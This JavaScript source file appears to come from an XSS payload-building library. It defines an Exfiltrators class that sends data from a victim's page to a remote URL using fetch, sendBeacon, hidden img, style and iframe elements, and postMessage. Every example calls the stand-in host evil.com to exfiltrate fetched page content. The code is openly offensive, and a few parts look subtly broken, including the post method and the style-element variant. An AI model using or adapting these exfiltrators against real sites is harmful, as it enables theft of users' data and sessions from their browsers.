

import Payload from "./Payload.js"

/**
 * Add a get parameter name to an existing url
 * @param {string} url  
 * @param {string} name of the parameter 
 * @return {string} An where you can append the data to exfiltrate
 */
function addURLParam(url, name) {
    return url + (url.includes("?") ? "&" : "?") + name + "="
}


/**
 * Collection of exfiltrators
 * @alias Exfiltrators
 */
class Exfiltrators {
    /**
     * Create an exfiltrator using fetch with GET request, the data is stringified as JSON and converted to base64 before exfiltration.  
     * 
     * @param {string} url Url to use for exfiltration 
     * @param {string} [paramName="data"] name of the parameter that must contain the exfiltrated data.  
     * @example
     * const exfiltrator = Exfiltrator.get("http://evil.com")
     * const p = Payload.new()
     *               .setExfiltrator(exfiltrator)
     *               .fetchJSON("/")
     *               .exfiltrate()
     * @returns {Payload} The exfiltrator function to use with [setExfiltrator]{@link Payload#setExfiltrator} and [addExfiltrator]{@link Payload#addExfiltrator}.
     */
    static get(url, paramName = "data") {
        const fetchUrl = addURLParam(url, paramName)
        return Payload.new().eval((u, x) => fetch(u + btoa(JSON.stringify(x)), { mode: 'no-cors', cache: 'no-cache' }), fetchUrl)
    }


    /**
     * Create an exfiltrator using fetch with POST request, the data is stringified as JSON before exfiltration.  
     * 
     * @param {string} url Url to use for exfiltration 
     * @param {string} [paramName="data"] name of the parameter that must contain the exfiltrated data.  
     * @example
     * const exfiltrator = Exfiltrator.post("http://evil.com")
     * const p = Payload.new()
     *               .setExfiltrator(exfiltrator)
     *               .fetchJSON("/")
     *               .exfiltrate()
     * @returns {Payload} The exfiltrator function to use with [setExfiltrator]{@link Payload#setExfiltrator} and [addExfiltrator]{@link Payload#addExfiltrator}.
     */
    static post(url, paramName = "data") {
        return Payload.new((u, n, x) => fetch(u, { mode: 'no-cors', method: 'POST', body: { [n]: JSON.stringify(x) } }), url, paramName)
    }


    /**
     * Create an exfiltrator using fetch with POST JSON request, the data is stringified as JSON before exfiltration.  <br>
     * <br>
     * Since it's not possible to set the content-type as application/json for cross domain requests, the content-type is set as text/plain. 
     * @param {string} url Url to use for exfiltration 
     * @example
     * const exfiltrator = Exfiltrator.postJSON("http://evil.com")
     * const p = Payload.new()
     *               .setExfiltrator(exfiltrator)
     *               .fetchJSON("/")
     *               .exfiltrate()
     * @returns {Payload} The exfiltrator function to use with [setExfiltrator]{@link Payload#setExfiltrator} and [addExfiltrator]{@link Payload#addExfiltrator}.
     */
    static postJSON(url) {
        return Payload.new().eval((u, x) => fetch(u, { mode: 'no-cors', method: 'POST', body: JSON.stringify(x) }), url)
    }


    /**
     * Create an exfiltrator using navigator.sendBeacon, the data is stringified as JSON before exfiltration. <br>
     * @param {string} url Url to use for exfiltration 
     * @example
     * const exfiltrator = Exfiltrator.sendBeacon("http://evil.com")
     * const p = Payload.new()
     *               .setExfiltrator(exfiltrator)
     *               .fetchJSON("/")
     *               .exfiltrate()
     * @returns {Payload} The exfiltrator function to use with [setExfiltrator]{@link Payload#setExfiltrator} and [addExfiltrator]{@link Payload#addExfiltrator}.
     */
    static sendBeacon(url) {
        return Payload.new().eval((u, x) => navigator.sendBeacon(u, JSON.stringify(x)), url)
    }


    /**
     * Create a debugging exfiltrator that log to the console.<br>
     * @param {string} [prefix=null] Prefix to add to console.log call
     * @example
     * const exfiltrator = Exfiltrator.console()
     * const p = Payload.new()
     *               .setExfiltrator(exfiltrator)
     *               .fetchJSON("/")
     *               .exfiltrate()
     * @returns {Payload} The exfiltrator function to use with [setExfiltrator]{@link Payload#setExfiltrator} and [addExfiltrator]{@link Payload#addExfiltrator}.
     */
    static console(prefix = null) {
        if (prefix !== null) {
            return Payload.new().eval((p, x) => console.log(p, x), prefix)
        } else {
            return Payload.new().log()
        }
    }


    /**
     * Create an exfiltrator using &lt;img&gt; element to perform GET request, the data is stringified as JSON and converted to base64 before exfiltration.  
     * 
     * @param {string} url Url to use for exfiltration 
     * @param {string} [paramName="data"] name of the parameter that must contain the exfiltrated data.  
     * @example
     * const exfiltrator = Exfiltrator.img("http://evil.com")
     * const p = Payload.new()
     *               .setExfiltrator(exfiltrator)
     *               .fetchJSON("/")
     *               .exfiltrate()
     * @returns {Payload} The exfiltrator function to use with [setExfiltrator]{@link Payload#setExfiltrator} and [addExfiltrator]{@link Payload#addExfiltrator}.
     */
    static img(url, paramName = "data") {
        const imgUrl = addURLParam(url, paramName)
        return Payload.new().eval((u, x) => {
            const i = document.createElement('img');
            i.src = u + btoa(JSON.stringify(x));
            i.hidden = true;
            document.body.appendChild(i)
        }, imgUrl)
    }


    /**
     * Create an exfiltrator using &lt;style&gt; element to perform GET request, the data is stringified as JSON and converted to base64 before exfiltration.  
     * 
     * @param {string} url Url to use for exfiltration 
     * @param {string} [paramName="data"] name of the parameter that must contain the exfiltrated data.  
     * @example
     * const exfiltrator = Exfiltrator.style("http://evil.com")
     * const p = Payload.new()
     *               .setExfiltrator(exfiltrator)
     *               .fetchJSON("/")
     *               .exfiltrate()
     * @returns {Payload} The exfiltrator function to use with [setExfiltrator]{@link Payload#setExfiltrator} and [addExfiltrator]{@link Payload#addExfiltrator}.
     */
    static style(url, paramName = "data") {
        const styleUrl = addURLParam(url, paramName)
        return Payload.new().eval((u, x) => {
            const s = document.createElement('style');
            s.src = u + btoa(JSON.stringify(x));
            s.hidden = true;
            document.body.appendChild(s)
        }, styleUrl)
    }


    /**
     * Create an exfiltrator using &lt;iframe&gt; element to perform GET request, the data is stringified as JSON and converted to base64 before exfiltration.  
     * 
     * @param {string} url Url to use for exfiltration 
     * @param {string} [paramName="data"] name of the parameter that must contain the exfiltrated data.  
     * @example
     * const exfiltrator = Exfiltrator.iframe("http://evil.com")
     * const p = Payload.new()
     *               .setExfiltrator(exfiltrator)
     *               .fetchJSON("/")
     *               .exfiltrate()
     * @returns {Payload} The exfiltrator function to use with [setExfiltrator]{@link Payload#setExfiltrator} and [addExfiltrator]{@link Payload#addExfiltrator}.
     */
    static iframe(url, paramName = "data") {
        const frameUrl = addURLParam(url, paramName)
        return Payload.new().eval((u, x) => {
            const i = document.createElement('iframe');
            i.src = u + btoa(JSON.stringify(x));
            i.hidden = true;
            document.body.appendChild(i)
        }, frameUrl)
    }


    /**
     * Create an exfiltrator using window.postMessage, the data is stringified as JSON before exfiltration.  
     * 
     * @param {string} [name="top"] Name of the targeted frame 
     * @param {string} [target="*"] Target for the message
     * @example
     * const exfiltrator = Exfiltrator.img("http://evil.com")
     * const p = Payload.new()
     *               .setExfiltrator(exfiltrator)
     *               .fetchJSON("/")
     *               .exfiltrate()
     * @returns {Payload} The exfiltrator function to use with [setExfiltrator]{@link Payload#setExfiltrator} and [addExfiltrator]{@link Payload#addExfiltrator}.
     */
    static message(frame = "top", target = "*") {
        return Payload.new().eval((frame, target, x) => window.frames[frame].postMessage(JSON.stringify(x), target), frame, target)
    }
}

export default Exfiltrators;